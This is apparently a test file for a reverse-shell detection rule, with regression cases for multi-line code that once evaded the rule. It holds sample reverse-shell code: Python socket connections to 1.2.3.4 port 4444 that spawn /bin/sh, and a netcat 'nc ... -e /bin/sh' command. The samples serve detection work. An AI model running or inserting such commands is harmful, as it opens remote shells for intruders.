"""Tests for threat-network-reverse-shell rule

Regression tests for issue #911: the multi-line forms below evaded the rule
entirely while YARA dot could not cross newlines. Each form must keep
matching after the newline-safe rework of the patterns.

RULEID cases:
  - socket chain split across two statements
  - socket constructor arguments wrapped across lines
  - netcat exec flag reached across a shell continuation
No Clear OK cases
"""

""" RULEID: threat-network-reverse-shell
"""
# ruleid: threat-network-reverse-shell
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("1.2.3.4", 4444))
subprocess.Popen("/bin/sh")

# ruleid: threat-network-reverse-shell
s = socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM,
)
s.connect(("1.2.3.4", 4444))
subprocess.Popen("/bin/sh")

# ruleid: threat-network-reverse-shell
CONNECT_BACK = """nc 1.2.3.4 4444 \
    -e /bin/sh
"""
